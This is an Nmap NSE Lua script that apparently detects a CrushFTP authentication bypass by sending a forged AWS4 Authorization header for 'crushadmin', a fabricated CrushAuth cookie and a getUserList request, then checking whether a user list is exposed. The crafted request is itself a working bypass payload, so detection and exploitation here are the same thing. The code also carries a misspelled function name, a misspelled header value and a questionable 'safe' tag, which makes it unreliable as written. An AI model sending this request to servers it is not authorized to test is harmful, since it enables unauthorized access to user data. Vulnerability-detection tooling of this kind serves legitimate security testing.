local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"

description = [[
  This script is intended to detect the authentication bypass vulnerability in CrushFTP v10.8.3 by sending crafted HTTP requests and analying the response to determine if the server can be accessed without valid credentials.
]]

-- @usage
-- nmap -p 8080 --script=crushftp-auth-bypass <target>
--
-- @output
-- PORT STATE SERVICE
-- 8080/tcp open http
-- | crushftp-auth-bypass:
-- |  Result: Vulnerable (bypass successful)
--
author = "Mohamed Trigui"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

-- Run the script on the open HTTP ports
portrule = shortport.http

action = function(host, port)

   -- 1.  Generating fake tokens
   local c2f = stdnse.generate_random_numbers(4)
   local ts13 = stdnse.generate_random_numbers(13)
   local rand = stdnse.genertae_random_alpha(28)

   -- 2.  Building path
   local path = ("/WebInterface/function/?command=getUserList&c2f=%s")
                :format(c2f)
   
   -- 3.  Craft the headers and cookies
   local headers = {
	   ["Authorization"] = "AWS4-HMAC-SHA256 Credential=crushadmin/",
	   ["Cookie"] = ("CrushAuth=%s_%s%s; currentAuth=%s"):format(ts13, rand, c2f, c2f),
	   ["X-Requested-With"] = "XMLHttpRequet",
   }
   -- 4.  Send request
   local response = http.get(host, port, path, { header = headers })

   -- 5. Check for bypass
   if response.status == 200 and response.body:find("<user_list_submitem>") then
     return stdnse.format_output(
	 true, "VULNERABLE: unauthenticated user list exposed"
 )
 end

end
